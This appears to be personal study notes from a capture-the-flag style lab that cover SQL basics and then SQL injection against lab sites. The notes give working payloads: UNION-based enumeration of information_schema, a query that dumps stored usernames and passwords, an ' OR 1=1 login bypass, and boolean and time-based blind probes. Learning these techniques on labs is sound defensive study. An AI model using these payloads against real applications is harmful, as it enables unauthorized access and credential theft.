SQL review: Relational - Uses tables with columns as fields and rows as entries. Each row must have a key field that is unique for each row. Entries are redundant across tables but have different columns, columns from entries are able to be pulled across tables with queries.
Non-relational - also NoSQL, don't use tables, columns, rows to store data. Structure can vary and entries can store different information, giving flexibility. Ex. MongoDB, ElasticSearch
DBMS - Database Management Software

Example Queries:

- select * from users;
- select username, password from users;
    ^-query--column-----column----------table^
- select * from users where username!='admin' and password='1234';
    Query Modifiers:
- LIMIT 1 / LIMIT 2,1 (skips 2)
- and / or
- like 'a%' or '%a%' or '%a' (start, contains, or ends with)

UNION:
Combines results of multiple SELECTs, even across tables, Requires same number of columns, same order, and similar data types in each SELECT.
SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
*each returns 3 entries individually, but UNION returns 6 entries*
Returns-> Name | Address | City | Postcode, but name and companies are returned as string types intermixed in the returned name field.
Edits (INSERT/UPDATE/DELETE):
INSERT into users (username,password) values ('brian', '1234');
UPDATE users SET username='newname',password='1234' where username='oldname';
DELETE from users where username='firedemployee';
DELETE from users; (wipes entire table...)

SQL Inject:
Use '--' to comment out the remaining query line
In-Band SQLi uses the same band of communication to send the exploit and receive the result.
Error-Based helps enumerate a DB through error message parsing
Union-Based uses UNION and SELECT to return additional results, especially on a large scale.
Ex. website.thm/blog?id=1, behind the scenes, SELECT * from blog where id=1 and private=0 LIMIT 1;
Inject -> id=2;-- , this pulls id 2 which is private and ignores the rest of the query.
Out-of-Band used a 3rd system to confirm / receive info from the server being interacted with. Example, hacker (command)-> SQL server (DNS request)-> hacker controlled DNS server -> back to hacker

Practical Examples:

Level 1 (In-Band)
website.thm/article?id=1
- Use error-based injections (use ' or " chars) to get back-end feedback on whats going on. If error is received, that means its manipulatable. ex. article?id=1'
- Then use union-based injections to compare info returned from returned article to a another select statement, ex article?id=1 UNION SELECT 1, specifying which column(s) to return to determine how many the returned article has. If error, then there was a mismatch in col numbers. \*\*SELECT 1 (inferred FROM \*table*, will return 1 for the amount of rows in a column)
- Iterate using more columns, ex. ...id=1 UNION SELECT 1,2,3, finding that 3 is the correct amount of columns (no errors)
- But the website still shows the proper article and not our UNION SELECT since its the second entry returned. To work around this, return a non-existent article number (0), or append LIMIT 1,1 (limit 1 return, jump ahead 1 result). Website now shows 1, 2, 3 in returned entry
- Return the name of the current database with ...UNION SELECT 1,2,database()
- Leverage the database name to feed SQL functions and locate other tables.
-- information\_schema.tables, gives all tables within the database, information\_schema.columns, etc...
-- group_concat(...), returns list items as a concatenated string
-- vars: table\_schema = name of the database/schema with table, table\_name, column_name
Finally, ...id=0 UNION SELECT 1,2,group\_concat(table\_name) FROM information\_schema.tables WHERE table\_schema = 'sqli_one'
- Now we have the table names, one of which is staff\_users, so to find columns in staff\_users, ...id=0 UNION SELECT 1,2,group\_concat(column\_name) FROM information\_schema.columns WHERE table\_name = 'staff_users'
- Now dump out this table since we have all its info, ...id=0 UNION SELECT 1,2,group\_concat(username,':', password) FROM staff\_users. Creds are dumped!

Level 2 (Blind SQLi - Auth Bypass)
- Very basic SQL inject, put: ' OR 1=1;-- in username or password field for candy

Level 3 (Blind SQLi - Boolean Based)
Similar to level 1, but server gives no error. It just confirms whether a searched entry exists or not. Ex. username=admin returns true, but =admin123 returns false. Since input isn't returned directly, we need to use, LIKE 'x%';-- statements to brute force database name (sqli_three), table name (users), columns (id, username, password), and then the admin password (3845).
- ex. ...admin123' SELECT UNION 1,2,3 FROM information\_schema.columns WHERE table\_schema = 'sqli\_three' AND table\_name = 'users' AND column_name LIKE 'x%';--
- in LIKE, % functions as a 0,1, or many wildcard, while _ is a 1 wildcard

Level 4
Similar to level 1 and 3, but using SLEEP(x) in the UNION to test based on response time.